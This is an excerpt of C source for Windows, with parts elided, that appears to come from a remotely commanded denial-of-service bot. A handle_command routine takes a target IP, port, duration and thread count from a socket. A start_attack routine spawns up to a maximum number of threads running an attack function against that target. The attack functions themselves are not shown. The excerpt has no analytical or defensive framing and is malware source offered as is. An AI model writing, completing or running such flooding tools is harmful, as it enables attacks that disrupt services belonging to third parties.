...
void start_attack(const char *method, const char *ip, int port, int duration, int thread_count, const char *username) {
    ...
    for (i = 0; i < thread_count && i < MAX_THREADS; i++) {
        ...
        HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)attack_func, params, 0, NULL);
        if (thread != NULL) {
            CloseHandle(thread);
            successful++;
        } else {
...
void handle_command(SOCKET sock, char *buffer) {
    char command[64] = {0};
    char ip[128] = {0};
    ...
    token = strtok(NULL, " ");
    if (token == NULL) { printf("[ERROR] Missing IP parameter\n"); return; }
    strncpy(ip, token, sizeof(ip) - 1);

    token = strtok(NULL, " ");
    if (token == NULL) { printf("[ERROR] Missing port parameter\n"); return; }
    port = atoi(token);

    token = strtok(NULL, " ");
    if (token == NULL) { printf("[ERROR] Missing duration parameter\n"); return; }
    duration = atoi(token);

    token = strtok(NULL, " ");
    if (token == NULL) { printf("[ERROR] Missing threads parameter\n"); return; }
    threads = atoi(token);
    ...
    if (port <= 0 || port > 65535) { printf("[ERROR] Invalid port: %d\n", port); return; }
    if (duration <= 0 || duration > 3600) { printf("[ERROR] Invalid duration: %d (max 3600s)\n", duration); return; }
    if (threads <= 0 || threads > MAX_THREADS) { printf("[ERROR] Invalid thread count: %d (max %d)\n", threads, MAX_THREADS); return; }
